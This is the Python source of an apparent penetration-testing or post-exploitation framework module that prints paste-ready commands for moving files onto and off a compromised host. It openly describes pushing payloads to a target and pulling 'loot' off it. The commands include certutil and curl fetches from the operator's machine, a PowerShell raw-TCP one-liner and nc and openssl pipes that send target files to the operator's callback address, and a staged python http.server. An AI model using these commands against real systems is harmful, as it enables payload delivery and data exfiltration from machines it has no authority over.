"""Transfer command generator: ready-to-paste file movement one-liners.

You have a shell on the target; now you need a file ONTO it (upload: a
payload, a tool) or OFF it (download: loot, a dump). This module prints
the exact commands for the classic channels, operator side and target
side, in the right order:

  - http: python3 -m http.server staged behind a 404 page (no directory
    listing leaking what else you host) + curl/wget/curl.exe fetch
  - openssl: s_server/s_client — TLS-encrypted movement with a binary
    present on nearly every Linux target, throwaway 1-day cert
  - nc: the plaintext fallback (nc/ncat variants)
  - ssh: scp/sftp/cat/tar when you hold SSH creds already

Nothing here executes — it's a cheat sheet that knows your paths, your
callback address, and the target's shell dialect (TARGET_OS windows gets
curl.exe, because curl/wget are Invoke-WebRequest aliases there).
Upload = operator -> target; download = target -> operator.
"""

import shlex
from shlex import quote as q

from core.module import AuxiliaryModule
from core.netutil import psq
from core.options import OptEnum, OptInt, OptString

HTTP_DIR = "/tmp/forge-serve"
HTTP_404 = "<!doctype html><title>404 Not Found</title><h1>404 Not Found</h1>"
OPENSSL_DIR = "/tmp/xfer"
OPENSSL_CERT = (
    f"mkdir -p {OPENSSL_DIR} && openssl req -x509 -newkey rsa:2048 "
    f"-keyout {OPENSSL_DIR}/key.pem -out {OPENSSL_DIR}/cert.pem "
    "-days 1 -nodes -subj '/CN=transfer'"
)


def http_serve_line(src_path, port):
    """Stage one file behind a 404 index page and serve it. index.html is
    written BEFORE the symlink so a payload literally named index.html
    can't write-through; the dir resets each run."""
    return (f"rm -rf {HTTP_DIR} && mkdir -p {HTTP_DIR} && "
            f"printf '%s' {q(HTTP_404)} > {HTTP_DIR}/index.html && "
            f"ln -sf {q(src_path)} {HTTP_DIR}/ && "
            f"cd {HTTP_DIR} && python3 -m http.server {port}")


def fetch_lines(url, dest, target_os):
    """Fetch one-liners for the target's OS. Windows gets curl.exe —
    curl/wget are Invoke-WebRequest aliases in PowerShell — plus the
    certutil fallback that's on every Windows box since XP."""
    if target_os == "windows":
        return (f"curl.exe -fsSL {q(url)} -OutFile {psq(dest)}",
                f"certutil -urlcache -split -f {q(url)} {psq(dest)}")
    return (f"curl -fsSL {q(url)} -o {q(dest)}",
            f"wget -q {q(url)} -O {q(dest)}")


def ps_upload_line(lhost, lport, src):
    """PowerShell raw-TCP upload — the windows download path when ncat
    isn't on the target."""
    return ("powershell -c \"$c=New-Object Net.Sockets.TcpClient("
            f"{psq(lhost)},{lport});$s=$c.GetStream();"
            f"$b=[IO.File]::ReadAllBytes({psq(src)});"
            "$s.Write($b,0,$b.Length);$c.Close()\"")


class Xfer(AuxiliaryModule):
    name = "Transfer Command Generator"
    description = """
        Prints ready-to-paste file-transfer commands for the classic
        channels: http (404-staged http.server), openssl (TLS pipe,
        throwaway cert), nc (with ncat/PowerShell variants for Windows),
        and ssh (scp/sftp/cat/tar). DIRECTION upload = operator to
        target; download = target to operator. TARGET_OS picks the remote
        shell dialect. Executes nothing — paste the lines into your
        session/smb_exec. Quote paths containing backslashes with SINGLE
        quotes: set REMOTE_PATH 'C:\\Temp\\loot.zip'.
    """
    authors = ["you"]

    def register_options(self):
        self.options.add(OptEnum("DIRECTION", ["upload", "download"],
                                 default="upload",
                                 description="upload: operator -> target; "
                                             "download: target -> operator"))
        self.options.add(OptString("LHOST", default="",
                                   description="Your address (falls back to setg "
                                               "LHOST / autodetect)"))
        self.options.add(OptInt("LPORT", default=8000, description="Listen port"))
        self.options.add(OptString("RHOST", default="",
                                   description="Target address (ssh/nc/send lines)"))
        self.options.add(OptString("RUSER", default="operator",
                                   description="SSH username for the ssh methods"))
        self.options.add(OptString("LOCAL_PATH", required=True,
                                   description="Path on YOUR side"))
        self.options.add(OptString("REMOTE_PATH", required=True,
                                   description="Path on the TARGET"))
        self.options.add(OptEnum("TARGET_OS", ["linux", "windows"], default="linux",
                                 description="Target's shell dialect"))
        self.options.add(OptString("METHODS", default="http,openssl,nc,ssh",
                                   description="Methods to print, comma-separated"))

    def run(self):
        from core.netutil import detect_local_ip

        direction = str(self.get_option("DIRECTION"))
        lhost = str(self.get_option("LHOST") or "").strip() or detect_local_ip()
        lport = int(self.get_option("LPORT"))
        rhost = str(self.get_option("RHOST") or "").strip() or "<RHOST>"
        ruser = str(self.get_option("RUSER") or "operator")
        local = str(self.get_option("LOCAL_PATH"))
        remote = str(self.get_option("REMOTE_PATH"))
        target_os = str(self.get_option("TARGET_OS"))
        methods = {m.strip() for m in str(self.get_option("METHODS")).split(",")
                   if m.strip()}

        src, dest = (local, remote) if direction == "upload" else (remote, local)
        if "http" in methods:
            self._http(direction, lhost, lport, src, dest, target_os)
        if "openssl" in methods:
            self._openssl(direction, lhost, lport, rhost, src, dest)
        if "nc" in methods:
            self._nc(direction, lhost, lport, rhost, src, dest, target_os)
        if "ssh" in methods:
            self._ssh(direction, rhost, ruser, local, remote, target_os)

    def _section(self, title):
        self.print_line(f"\n== {title} " + "=" * max(4, 60 - len(title)))

    def _http(self, direction, lhost, lport, src, dest, target_os):
        import os
        from urllib.parse import quote as urlquote

        self._section(f"HTTP ({direction})")
        name = os.path.basename(src.rstrip("/\\")) or "file"
        if direction == "upload":
            self.print_line(f"# on YOU (server):\n{http_serve_line(src, lport)}")
            url = f"http://{lhost}:{lport}/{urlquote(name)}"
            primary, alt = fetch_lines(url, dest, target_os)
            self.print_line(f"# on TARGET (fetch):\n{primary}\n# or:\n{alt}")
            return
        if target_os == "windows":
            self.print_line("# no http.server on a Windows target — pull the "
                            "file with NETCAT/PowerShell (below) or an SMB share")
            return
        self.print_line(f"# on TARGET (server):\n{http_serve_line(src, lport)}")
        url = f"http://{lhost}:{lport}/{urlquote(name)}"
        self.print_line(f"# on YOU (fetch):\ncurl -fsSL {q(url)} -o {q(dest)}"
                        f"\n# or:\nwget -q {q(url)} -O {q(dest)}")

    def _openssl(self, direction, lhost, lport, rhost, src, dest):
        self._section(f"OPENSSL ({direction}) — encrypted")
        self.print_line(f"# on the RECEIVER first:\n{OPENSSL_CERT}")
        server = (f"openssl s_server -quiet -accept {lport} "
                  f"-cert {OPENSSL_DIR}/cert.pem -key {OPENSSL_DIR}/key.pem")
        if direction == "upload":
            self.print_line(f"# on TARGET (receiver):\n{server} > {q(dest)}")
            self.print_line(f"# on YOU (sender):\n"
                            f"openssl s_client -quiet -connect {rhost}:{lport} < {q(src)}")
        else:
            self.print_line(f"# on YOU (receiver):\n{server} > {q(dest)}")
            self.print_line(f"# on TARGET (sender):\n"
                            f"openssl s_client -quiet -connect {lhost}:{lport} < {q(src)}")

    def _nc(self, direction, lhost, lport, rhost, src, dest, target_os):
        self._section(f"NETCAT ({direction}) — plaintext")
        if direction == "upload":
            if target_os == "windows":
                self.print_line(f"# on TARGET (receiver, needs ncat):\n"
                                f"ncat -l -p {lport} > {psq(dest)}")
            else:
                self.print_line(f"# on TARGET (receiver):\n"
                                f"nc -l -p {lport} > {q(dest)}\n"
                                f"# (openbsd variant: nc -l {lport} > {q(dest)})")
            self.print_line(f"# on YOU (sender):\nnc {rhost} {lport} < {q(src)}")
            return
        self.print_line(f"# on YOU (receiver):\n"
                        f"nc -l -p {lport} > {q(dest)}\n"
                        f"# (openbsd variant: nc -l {lport} > {q(dest)})")
        if target_os == "windows":
            self.print_line(f"# on TARGET (sender, needs ncat):\n"
                            f"ncat {lhost} {lport} < {psq(src)}")
            self.print_line("# on TARGET (sender, stock PowerShell):\n"
                            + ps_upload_line(lhost, lport, src))
        else:
            self.print_line(f"# on TARGET (sender):\nnc {lhost} {lport} < {q(src)}")

    def _ssh(self, direction, rhost, ruser, local, remote, target_os):
        self._section(f"SSH ({direction})")
        if target_os == "windows":
            self.print_line("# ssh methods assume a POSIX target shell")
            return
        host = f"{ruser}@{rhost}"
        if direction == "upload":
            self.print_line(f"scp {q(local)} {host}:{q(remote)}")
            self.print_line(f"sftp -b - {host} <<< "
                            f"{q('put ' + q(local) + ' ' + q(remote))}")
            self.print_line(f"cat {q(local)} | ssh {host} {q('cat > ' + q(remote))}")
        else:
            self.print_line(f"scp {host}:{q(remote)} {q(local)}")
            self.print_line(f"sftp -b - {host} <<< "
                            f"{q('get ' + q(remote) + ' ' + q(local))}")
            self.print_line(f"ssh {host} {q('cat ' + q(remote))} > {q(local)}")
